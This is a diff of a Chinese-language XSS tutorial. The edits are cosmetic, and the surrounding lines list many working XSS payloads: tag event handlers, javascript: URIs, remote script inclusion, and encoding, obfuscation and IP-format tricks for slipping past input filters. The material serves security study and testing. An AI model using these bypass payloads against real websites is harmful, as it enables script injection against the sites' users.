@@ -1,6 +1,6 @@
 # XSS 跨站脚本攻击
 
-XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。
+XSS ( Cross Site Scripting ) 是**指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去**。使别的用户访问都会执行相应的嵌入代码。
 
 从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。
 
@@ -247,72 +247,72 @@ Content-Security-Policy: child-src 'none'
 ### `<video>`
 
     <video><source onerror="alert(1)">
-    
+
 
 ### `<audio>`
 
     <audio src=x  onerror=alert("xss");>
-    
+
 
 ### `<body>`
 
     <body/onload=alert("xss");>
-    
+
 
 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
 
     <body
     onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
-    
+
 
 ### `<textarea>`
 
     <textarea onfocus=alert("xss"); autofocus>
-    
+
 
 ### `<keygen>`
 
     <keygen autofocus onfocus=alert(1)> //仅限火狐
-    
+
 
 ### `<marquee>`
 
     <marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以
-    
+
 
 ### `<isindex>`
 
     <isindex type=image src=1 onerror=alert("xss")>//仅限于IE
-    
+
 
 ### 利用link远程包含js文件
 
 **PS：在无CSP的情况下才可以**
 
     <link rel=import href="http://127.0.0.1/1.js">
-    
+
 
 ### javascript伪协议
 
 `<a>`标签
 
     <a href="javascript:alert(`xss`);">xss</a>
-    
+
 
 `<iframe>`标签
 
     <iframe src=javascript:alert('xss');></iframe>
-    
+
 
 `<img>`标签
 
     <img src=javascript:alert('xss')>//IE7以下
-    
+
 
 `<form>`标签
 
     <form action="Javascript:alert(1)"><input type=submit>
-    
+
 
 ### 其它
 
@@ -321,12 +321,12 @@ expression属性
     <img style="xss:expression(alert('xss''))"> // IE7以下
     <div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
     <style>#test{x:expression(alert(/XSS/))}</style> // IE7以下
-    
+
 
 background属性
 
     <table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效
-    
+
 
 有过滤的情况下
 =======
@@ -360,7 +360,7 @@ background属性
 利用top
 
     <script>top["al"+"ert"](`xss`);</script>
-    
+
 
 ### 其它字符混淆
 
@@ -371,7 +371,7 @@ background属性
     1.<<script>alert("xss");//<</script>
     2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
     3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
-    
+
 
 ### 编码绕过
 
@@ -386,7 +386,7 @@ url编码绕过
 <img src\="x" onerror\="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"\>
 
     <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
-    
+
 
 Ascii码绕过
 
@@ -395,19 +395,19 @@ Ascii码绕过
 hex绕过
 
     <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
-    
+
 
 八进制
 
     <img src=x onerror=alert('\170\163\163')>
-    
+
 
 base64绕过
 
     <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
     
     <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
-    
+
 
 过滤双引号，单引号
 ---------
@@ -415,7 +415,7 @@ base64绕过
 1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号
 
     <img src="x" onerror=alert(`xss`);>
-    
+
 
 2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了
 
@@ -425,7 +425,7 @@ base64绕过
 当括号被过滤的时候可以使用throw来绕过
 
     <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
-    
+
 
 过滤url地址
 -------
@@ -433,34 +433,34 @@ base64绕过
 ### 使用url编码
 
     <img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
-    
+
 
 ### 使用IP
 
 1.十进制IP
 
     <img src="x" onerror=document.location=`http://2130706433/`>
-    
+
 
 2.八进制IP
 
     <img src="x" onerror=document.location=`http://0177.0.0.01/`>
-    
+
 
 3.hex
 
     <img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
-    
+
 
 4.html标签中用`//`可以代替`http://`
 
     <img src="x" onerror=document.location=`//www.baidu.com`>
-    
+
 
 5.使用`\\`
 
     但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议
-    
+
 
 Windows下  
 ![](https://xzfile.aliyuncs.com/media/upload/picture/20190208102122-3a40fff4-2b48-1.gif)  
@@ -470,4 +470,3 @@ Linux下
 如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
 
     <img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
-    
